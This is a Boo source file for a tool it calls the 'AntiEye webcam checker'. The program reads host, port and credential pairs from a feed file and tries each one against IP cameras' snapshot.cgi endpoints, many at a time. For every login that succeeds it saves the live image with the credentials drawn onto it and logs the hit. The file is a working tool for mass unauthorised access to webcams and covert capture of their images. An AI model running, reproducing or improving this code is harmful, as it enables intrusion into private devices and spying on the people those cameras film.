# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# AntiEye webcam checker v0.05
# Developed in 2018 by Guevara-chan.
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

import System
import System.IO
import System.Net
import System.Drawing
import System.Threading
import System.Reflection
import System.Text.RegularExpressions
import System.Runtime.CompilerServices
import System.Configuration from System.Configuration

#.{ [Classes]
class CUI():
	static final channels = {"fail": "Red", "success": "Cyan", "launch": "DarkGray", "io": "Yellow",
		"fault": "DarkRed", "meta": "Green"}

	def constructor():
		dbg("")
		log("""# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
			# AntiEye webcam checker v0.05      #
			# Developed in 2018 by V.A. Guevara #
			# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #""".Replace('\t', ''), "meta")

	# --Methods goes here.
	def log(info, channel as string):
		lock self:
			Console.ForegroundColor = Enum.Parse(ConsoleColor, channels[channel])
			print "$info"
			Console.ForegroundColor = ConsoleColor.Gray

	def dbg(info):
		Console.Title = "◢.AntiEye$info.◣"

	def destructor():
		Console.ForegroundColor = ConsoleColor.Gray
		Threading.Thread.Sleep(3000)
# -------------------- #
class DirReport():
	final dest		= ""
	final succfile 	= null
	final failfile	= null
	final channels	= {}

	def constructor(title as string):
		Directory.CreateDirectory(dest = "$(IO.Path.GetFileName(title))~shots")
		succfile, failfile = (File.CreateText(req("$f.txt")) for f in ('success', 'fail'))
		channels = {"success": succfile, "fail": failfile}

	def echo(info, channel as string):
		lock self:
			out = channels[channel] as StreamWriter
			out.WriteLine(text = "$info")
			out.Flush()
		return text

	def store(bmp as Bitmap, name as string):
		bmp.Save(path = req(name))
		return path

	def req(fname as string):
		return "$dest/$fname"
# -------------------- #
class Checker():
	final tasks			= Collections.Generic.Dictionary[of WebClient, DateTime]()
	final reductor		= Timer({reduce()}, null, 0, 1000)
	final debugger		= Timer({dbg(" [$tension/$max_tension)]")}, null, 0, 200)
	final log			= {info, channel|info = ':I am Error:'; return self}
	final dbg			= {info|info = ':I am Error:'; return self}
	final reporter		= void
	final max_tension	= 16
	final timeout		= 30

	# --Methods goes here.
	def constructor(ui as duck, storage as Type):
		log			= {info, channel|ui.log(info, channel); return self}
		dbg			= {info|ui.dbg(info); return self}
		reporter	= storage
		safety		= false if safety

	def check(url as Uri, dest as duck):
		user, password = url.UserInfo.Split(char(':'))
		req = Net.WebClient()
		req.DownloadDataAsync(Uri("$(url)snapshot.cgi?user=$(user)&pwd=$(password)"))
		req.DownloadDataCompleted += checker(url, dest)
		lock tasks: log("Launching check for $url", 'launch').tasks.Add(req, DateTime.Now)
		return self

	def checker(url as Uri, dest as duck):
		return def(sender as WebClient, e as DownloadDataCompletedEventArgs):
			lock tasks:
				return self unless tasks.Remove(sender)
			# Error checkup.
			try:
				bmp = Bitmap(MemoryStream(e.Result)) unless e.Cancelled or e.Error
				Graphics.FromImage(bmp).Dispose() # Fu**ing Mono.
			except: bmp = null
			unless bmp:
				dest.echo(url, 'fail')
				return log("Unable to load $url", 'fail')
			# Screenshot init.
			using out = Graphics.FromImage(bmp):
				login = url.UnescapeDataString(url.UserInfo)
				rect = Rectangle(start = Point(5, 5), out.MeasureString(login, font = Font('Sylfaen', 11)).ToSize())
				rect.Width += 2
				out.FillRectangle(SolidBrush(Color.Black), rect)
				out.DrawRectangle(Pen(forecolor = Color.Coral, 1), rect)
				out.DrawString(login, font, SolidBrush(forecolor), start)
			shot = dest.store(bmp, "$(url.Host)[$(url.Port)].jpg")
			# Finalization.
			log("$shot was taken from $url", 'success')
			dest.echo(url, 'success')
			return self

	def reduce():
		lock tasks:
			for entry in Collections.Generic.Dictionary[of WebClient, DateTime](tasks):
				entry.Key.CancelAsync() if (DateTime.Now - entry.Value).TotalSeconds > timeout
		return self

	[Extension] static def parse(entry as string):
		entry = Regex(" ").Replace(entry, '\n', 1)
		if Regex.Matches(entry, ":").Count == 2 and Regex.Matches(entry, "\n").Count == 1:
			host, port, user, pword = entry.Split(char(':'), char('\n'))
			return Uri("http://$(Uri.EscapeDataString(user)):$(Uri.EscapeDataString(pword))@$host:$port")

	[Extension] static def echo(out as StreamWriter, text as string):
		out.WriteLine(text)
		out.Flush()
		return text

	tension:
		get: return tasks.Count

	feed:
		set:
			try:
				log("\nParsing '$value'...", 'io')
				feeder = File.ReadLines(value).GetEnumerator()
				dest = reporter(value)
				while true:
					if tension < max_tension and feeder.MoveNext():
						if (url = feeder.Current.parse()): check(url, dest)
						else: log("Invalid entry encountered: $(feeder.Current)", 'fault')
					elif tension == 0: break
			except ex: log("$ex", 'fault')

	static safety:
		set:
			settingsSectionType  = Assembly.GetAssembly(typeof(Net.Configuration.SettingsSection))\
			.GetType("System.Net.Configuration.SettingsSectionInternal")
			anInstance = settingsSectionType.InvokeMember("Section", BindingFlags.Static
	 		| BindingFlags.GetProperty | BindingFlags.NonPublic, null, null, (,));
			aUseUnsafeHeaderParsing = settingsSectionType.GetField("useUnsafeHeaderParsing", BindingFlags.NonPublic
	 		| BindingFlags.Instance)
			aUseUnsafeHeaderParsing.SetValue(anInstance, not value)
		get: 
			sect as duck = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None)\
			.GetSection("system.net/settings")
			return not sect.HttpWebRequest.UseUnsafeHeaderParsing
#.}

# ==Main code==
def Main(argv as (string)):	
	Checker(CUI(), DirReport).feed = (argv[0] if argv.Length else 'feed.txt')